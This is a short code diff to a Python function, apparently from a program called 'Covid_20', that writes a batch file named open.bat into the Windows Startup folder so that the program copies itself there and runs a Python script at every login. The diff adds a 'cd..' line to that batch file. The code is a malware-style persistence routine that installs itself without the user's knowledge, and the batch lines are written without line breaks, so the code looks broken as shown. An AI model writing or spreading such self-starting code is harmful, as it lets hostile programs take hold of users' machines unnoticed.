@@ -45,6 +45,7 @@ def windows():
             file_path = os.path.dirname(os.path.realpath(__file__))
         bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
         with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+            bat_file.write(r'cd..')
             bat_file.write(r'cp Covid_20 "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
             bat_file.write(r'python "" %s' % file_path)
     
